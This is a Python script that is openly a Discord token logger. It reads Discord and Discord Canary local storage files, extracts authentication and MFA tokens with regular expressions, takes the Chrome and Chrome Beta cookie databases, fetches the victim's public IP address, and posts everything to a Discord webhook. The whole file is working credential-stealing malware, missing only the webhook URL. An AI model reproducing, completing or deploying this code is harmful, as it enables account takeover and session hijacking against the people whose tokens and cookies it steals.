import os
import aiohttp
import re
import discord
import asyncio
import requests
from discord import Webhook, AsyncWebhookAdapter


regular_regex = re.compile(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}')
mfa_regex = re.compile(r"mfa\.[\w-]{84}")
webhook = ""
local_cache = os.environ['APPDATA']
localapp = os.environ['LOCALAPPDATA']
main = f"{local_cache}/discord/Local Storage/leveldb"
canary = f"{local_cache}/discordcanary/Local Storage/leveldb"
chrome_cookies = f"{localapp}/Google/Chrome/User Data/Default/Cookies"
chrome_beta_cookies = f"{localapp}/Google/Chrome Beta/User Data/Default/Cookies"
main_tokens = []
canary_tokens = []

# main client
if os.path.exists(main):
    for f in os.listdir(main):
        if f.endswith(".ldb"):
            for x in open(f"{main}/{f}", errors='ignore').readlines():
                found = mfa_regex.findall(x)
                if found:
                    main_tokens.append(found[0])
                found_non_mfa = regular_regex.findall(x)
                if found_non_mfa:
                    main_tokens.append(found_non_mfa[0])

# canary client
if os.path.exists(canary):
    for f in os.listdir(canary):
        if f.endswith(".ldb"):
            for x in open(f"{canary}/{f}", errors='ignore').readlines():
                found = mfa_regex.findall(x)
                if found:
                    canary_tokens.append(found[0])
                found_non_mfa = regular_regex.findall(x)
                if found_non_mfa:
                    canary_tokens.append(found_non_mfa[0])


if os.path.isfile(chrome_cookies):
    global chrome_release
    global cr_exists
    cr_exists = True
    chrome_release = discord.File(chrome_cookies)
else:
    cr_exists = False

if os.path.isfile(chrome_beta_cookies):
    global chrome_beta
    global crb_exists
    crb_exists = True
    chrome_beta = discord.File(open(chrome_beta_cookies, "rb"))
else:
    crb_exists = False

# print(canary_tokens)
# print(main_tokens)
async def send():
    async with aiohttp.ClientSession() as session:
        w = Webhook.from_url(webhook, adapter=AsyncWebhookAdapter(session))
        e = discord.Embed(title="Token Logger", description="")
        e.add_field(name="Canary Tokens", value="\n\n".join(canary_tokens), inline=False)
        e.add_field(name="\nDefault Client Tokens", value="\n\n".join(main_tokens), inline=False)
        e.add_field(name="IP", value=requests.get("https://api.ipify.org").text)
        if crb_exists:
            wb = Webhook.from_url(webhook, adapter=AsyncWebhookAdapter(session))
            eb = discord.Embed(title="Chrome Beta Cookies", description="")
            await wb.send(file=chrome_beta, embed=eb)
        elif cr_exists:
            wr = Webhook.from_url(webhook, adapter=AsyncWebhookAdapter(session))
            er = discord.Embed(title="Chrome Cookies", description="")
            await wr.send(file=chrome_release, embed=er)
        await w.send(embed=e)



def main():
    loop = asyncio.get_event_loop()
    loop.run_until_complete(send())
    loop.close()

main()
